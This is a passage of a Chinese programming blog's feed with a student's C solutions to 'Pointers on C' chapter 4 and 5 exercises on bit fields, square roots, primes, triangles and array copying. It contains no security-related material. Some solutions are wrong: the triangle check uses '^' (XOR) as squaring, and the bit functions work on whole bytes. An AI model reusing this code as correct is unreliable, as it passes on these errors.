class="line"><span class="comment">* 作者：人工智障plus</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number )</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">clear_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number )</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">assign_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number, <span class="type">int</span> value )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">test_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> <span class="built_in">array</span>[<span class="number">10</span>]=&#123;<span class="string">&quot;000000000&quot;</span>&#125;;</span><br><span class="line">set_bit(<span class="built_in">array</span>,<span class="number">0</span>);</span><br><span class="line">set_bit(<span class="built_in">array</span>,<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="built_in">array</span>);</span><br><span class="line">clear_bit(<span class="built_in">array</span>,<span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="built_in">array</span>);</span><br><span class="line">assign_bit(<span class="built_in">array</span>,<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="built_in">array</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number )</span></span><br><span class="line">&#123;</span><br><span class="line">bit_array[bit_number] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number )</span></span><br><span class="line">&#123;</span><br><span class="line">bit_array[bit_number] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">assign_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number, <span class="type">int</span> value )</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(value == <span class="number">0</span>) </span><br><span class="line">bit_array[bit_number] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">bit_array[bit_number] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">test_bit</span><span class="params">( <span class="type">char</span> bit_array[], <span class="type">unsigned</span> bit_number )</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(bit_array[bit_number] != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="题目5"><a class="markdownIt-Anchor" href="#题目5"></a> 题目5</h2><p><img src="/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20220322203301130.png" alt="5"></p><p>​<img src="/2022/03/26/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E4%BA%94%E7%AB%A0/image-20220322203316084.png" alt="5-1"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：指定位储存</span></span><br><span class="line"><span class="comment">* 时间：2022/3/23</span></span><br><span class="line"><span class="comment">* 分析：见提示</span></span><br><span class="line"><span class="comment">* 总结：用或运算来置一创建掩码。</span></span><br><span class="line"><span class="comment">* 改进：</span></span><br><span class="line"><span class="comment">* 作者：人工智障plus</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">store_bit_field</span><span class="params">(<span class="type">int</span> original_value, <span class="type">int</span> value_to_store, <span class="type">unsigned</span> starting_bit, <span class="type">unsigned</span> ending_bit)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line">result = store_bit_field(<span class="number">0xffff</span>, <span class="number">0x123</span>, <span class="number">13</span>, <span class="number">9</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%0x\n&quot;</span>, result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">store_bit_field</span><span class="params">(<span class="type">int</span> original_value, <span class="type">int</span> value_to_store, <span class="type">unsigned</span> starting_bit, <span class="type">unsigned</span> ending_bit)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> mask = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//制作对应的起始位置掩码</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> idx = starting_bit; idx &gt;= ending_bit; idx--)</span><br><span class="line">&#123;</span><br><span class="line">tmp = <span class="number">1</span>&lt;&lt; idx;</span><br><span class="line">mask |= tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过掩码将original_value 对应的范围内置0</span></span><br><span class="line">original_value &amp;= ~mask;</span><br><span class="line"><span class="comment">//将value_to_store对齐起始和结束位置</span></span><br><span class="line">value_to_store  &lt;&lt;= ending_bit;</span><br><span class="line"><span class="comment">//value_to_store中将超出范围的部分置0</span></span><br><span class="line">value_to_store &amp;= mask;</span><br><span class="line"><span class="comment">//将值和original_value取或保存值</span></span><br><span class="line">original_value |= value_to_store;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> original_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第五章编程题59&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第五章编程题59&quot;&gt;&lt;/a&gt; 第五章—编程题5.9&lt;/h1&gt;
&lt;h2 id=&quot;题目1&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#题目1&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="题库/作业" scheme="https://www.rgzzplus.com/categories/%E9%A2%98%E5%BA%93-%E4%BD%9C%E4%B8%9A/"/>
    
    
    <category term="C和指针" scheme="https://www.rgzzplus.com/tags/C%E5%92%8C%E6%8C%87%E9%92%88/"/>
    
  </entry>
  
  <entry>
    <title>C和指针编程题--第四章</title>
    <link href="https://www.rgzzplus.com/2022/03/22/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E5%9B%9B%E7%AB%A0/"/>
    <id>https://www.rgzzplus.com/2022/03/22/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E5%9B%9B%E7%AB%A0/</id>
    <published>2022-03-22T11:33:07.000Z</published>
    <updated>2022-03-26T11:10:10.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第四章编程题414"><a class="markdownIt-Anchor" href="#第四章编程题414"></a> 第四章—编程题4.14</h1><h2 id="题目1"><a class="markdownIt-Anchor" href="#题目1"></a> 题目1</h2><p><img src="/2022/03/22/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E5%9B%9B%E7%AB%A0/../../document/Markdown/C%E5%92%8C%E6%8C%87%E9%92%88%E4%B9%A0%E9%A2%98/4/4-14/image-20220320230529977.png" alt="1"></p><p><img src="/2022/03/22/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E5%9B%9B%E7%AB%A0/../../document/Markdown/C%E5%92%8C%E6%8C%87%E9%92%88%E4%B9%A0%E9%A2%98/4/4-14/image-20220320230554968.png" alt="1.1"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：用公式计算正数 numb 的平方根</span></span><br><span class="line"><span class="comment">* 时间：2022/3/20</span></span><br><span class="line"><span class="comment">* 总结：学会使用绝对值函数，整数下用abs()，浮点数下用fabs()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 公式对应值；</span></span><br><span class="line"><span class="comment">    * n = numb,numb_next = a_1, numb_dnext = a_2</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="type">double</span> numb, numb_next, numb_dnext;</span><br><span class="line">numb = <span class="number">3</span>;</span><br><span class="line">numb_next = <span class="number">1</span>;</span><br><span class="line">numb_dnext = <span class="number">3</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 1.最开始想将下面的if判断用作while循环条件，</span></span><br><span class="line"><span class="comment">    * 调试发现，numb_next后来一直等于numb_dnext。</span></span><br><span class="line"><span class="comment">    * 2.近似值判定条件，即程序停止判定条件，</span></span><br><span class="line"><span class="comment">    * 用相邻两数相减区绝对值，然后域精确度比较。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">numb_dnext = (numb_next + numb / numb_next) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">fabs</span>(numb_dnext - numb_next) &lt; <span class="number">0.00001</span>) <span class="keyword">break</span>;</span><br><span class="line">numb_next = numb_dnext;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f&quot;</span>, numb_dnext);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目2"><a class="markdownIt-Anchor" href="#题目2"></a> 题目2</h2><p><img src="/2022/03/22/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E5%9B%9B%E7%AB%A0/../../document/Markdown/C%E5%92%8C%E6%8C%87%E9%92%88%E4%B9%A0%E9%A2%98/4/4-14/image-20220320233034237.png" alt="2"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：打印1~100间质数</span></span><br><span class="line"><span class="comment">* 时间：2022/3/20</span></span><br><span class="line"><span class="comment">* 总结：这里也可以把内层循环做成函数，放在外面，提高阅读性</span></span><br><span class="line"><span class="comment">* 改进：可以将内层循环改为 for(i = (int)sqrt(n); i &gt; 1; i--)</span></span><br><span class="line"><span class="comment">*使得减小其循环次数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">1</span>, n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 1.外层循环取出1~100间所有的整数给n</span></span><br><span class="line"><span class="comment">* 2.内层循环判断出n是否是质数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">for</span>( n = <span class="number">1</span>; n &lt;= <span class="number">100</span>; n++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>( i = n/<span class="number">2</span>; i &gt; <span class="number">1</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( (n % i) == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目三"><a class="markdownIt-Anchor" href="#题目三"></a> 题目三</h2><p><img src="/2022/03/22/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E5%9B%9B%E7%AB%A0/../../document/Markdown/C%E5%92%8C%E6%8C%87%E9%92%88%E4%B9%A0%E9%A2%98/4/4-14/image-20220320235157698.png" alt="3"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：判断三角形类型</span></span><br><span class="line"><span class="comment">* 时间：2022/3/20</span></span><br><span class="line"><span class="comment">* 分析：1.首先要确定其是一个三角形：任意两边之和大于第三边</span></span><br><span class="line"><span class="comment">*2.再判断三角形类型：直角（勾股定理），等边，等腰</span></span><br><span class="line"><span class="comment">* 总结：复制完交换代码，不要忘记更改参数</span></span><br><span class="line"><span class="comment">* 改进：将交换单独设置为函数，提高代码可读性</span></span><br><span class="line"><span class="comment">*用while循环使得用户输入失败时，重新输入</span></span><br><span class="line"><span class="comment">* 作者：人工智障plus</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a,b,c=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> temp = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入三角形三边长度：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;b);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;c);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 先判断是不是三角形，</span></span><br><span class="line"><span class="comment">* 分解：找出两条小边，再与长边比较</span></span><br><span class="line"><span class="comment">*或者先找最大边</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(a &lt; b)</span><br><span class="line">&#123;</span><br><span class="line">temp = a;</span><br><span class="line">a = b;</span><br><span class="line">b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(a &lt; c)</span><br><span class="line">&#123;</span><br><span class="line">temp = a;</span><br><span class="line">a = c;</span><br><span class="line">c = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>((b+c) &lt; a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;您输入的数据不能构成一个三角形\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 判断三角形类型</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>( (a==b)&amp;&amp;(b==c) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;此三角形是等边三角形\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( (a==b)||(b==c)||(a==c) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;此三角形是等腰三角形\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( (a^<span class="number">2</span>)==((b^<span class="number">2</span>)+(c^<span class="number">2</span>)) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;此三角形是直角三角形\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;此三角形是普通三角形\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="题目四"><a class="markdownIt-Anchor" href="#题目四"></a> 题目四</h2><p><img src="/2022/03/22/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E5%9B%9B%E7%AB%A0/../../document/Markdown/C%E5%92%8C%E6%8C%87%E9%92%88%E4%B9%A0%E9%A2%98/4/4-14/image-20220321002144937.png" alt="4"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：复制字符串数组到另一个数组，并且正好复制n个</span></span><br><span class="line"><span class="comment">* 时间：2022/3/21</span></span><br><span class="line"><span class="comment">* 分析：因为始终要控制其长度为n，所以外层循环控制长度，</span></span><br><span class="line"><span class="comment">*循环体内控制复制字符</span></span><br><span class="line"><span class="comment">* 总结：了解到一种计算字符数组长度的方法：length=sizeof(a)/sizeof(a[0]);</span></span><br><span class="line"><span class="comment">* 改进：增加检查数组长度，以确定传值是否合法</span></span><br><span class="line"><span class="comment">* 作者：人工智障plus</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_n</span><span class="params">( <span class="type">char</span> dst[], <span class="type">char</span> src[], <span class="type">int</span> n)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> a[<span class="number">5</span>]=&#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>&#125;;</span><br><span class="line"><span class="type">char</span> b[<span class="number">5</span>];</span><br><span class="line">copy_n(b,a,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">2</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,b[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 确定 src[] 的长度</span></span><br><span class="line"><span class="comment">* 1.计算数组长度，失败，sizeof不能在传递参数名的函数内来获取长度</span></span><br><span class="line"><span class="comment">* 2.在最后检验字符串结束标志</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_n</span><span class="params">( <span class="type">char</span> dst[], <span class="type">char</span> src[], <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( src[i] != <span class="string">&#x27;\0&#x27;</span> )</span><br><span class="line">dst[i] = src[i];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">dst[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目五"><a class="markdownIt-Anchor" href="#题目五"></a> 题目五</h2><p><img src="/2022/03/22/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E5%9B%9B%E7%AB%A0/../../document/Markdown/C%E5%92%8C%E6%8C%87%E9%92%88%E4%B9%A0%E9%A2%98/4/4-14/image-20220321091440651.png" alt="5"></p><p><img src="/2022/03/22/C%E5%92%8C%E6%8C%87%E9%92%88%E7%BC%96%E7%A8%8B%E9%A2%98-%E7%AC%AC%E5%9B%9B%E7%AB%A0/../../document/Markdown/C%E5%92%8C%E6%8C%87%E9%92%88%E4%B9%A0%E9%A2%98/4/4-14/image-20220321091512765.png" alt="5—1"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 编译环境：vs2022</span></span><br><span class="line"><span class="comment">* 题目简介：读取文件文本内容并打印</span></span><br><span class="line"><span 